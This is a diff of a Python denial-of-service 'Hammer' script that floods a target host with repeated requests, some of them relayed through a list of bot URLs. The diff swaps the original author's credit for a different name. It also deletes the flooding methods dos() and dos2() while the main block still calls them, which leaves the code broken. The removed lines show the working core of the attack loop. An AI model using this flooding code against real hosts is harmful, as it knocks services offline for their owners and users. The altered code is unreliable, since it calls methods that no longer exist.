@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 # python 3.3.2+ Hammer Dos Script v.1
-# by Scav-engeR
+# by Can Yalçın
 # only for legal purpose
 
 from queue import Queue
@@ -92,21 +92,7 @@ q = Queue()
 w = Queue()
 
 class MyTest(BaseCase):
-    def dos(self):
-        while True:
-            item = q.get()
-            self.driver.get(f"http://{host}")
-            print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
-            time.sleep(0.1)
-            q.task_done()
-
-    def dos2(self):
-        while True:
-            item = w.get()
-            self.driver.get(random.choice(bots) + f"http://{host}")
-            print("\033[94mbot is hammering...\033[0m")
-            time.sleep(0.1)
-            w.task_done()
+    pass  # No need to define methods here
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -116,6 +102,6 @@ if __name__ == "__main__":
     print("\033[94mPlease wait...\033[0m")
     user_agent()
     my_bots()
-    with MyTest() as test:
-        test.dos()
-        test.dos2()
+    test = MyTest()
+    test.dos()
+    test.dos2()
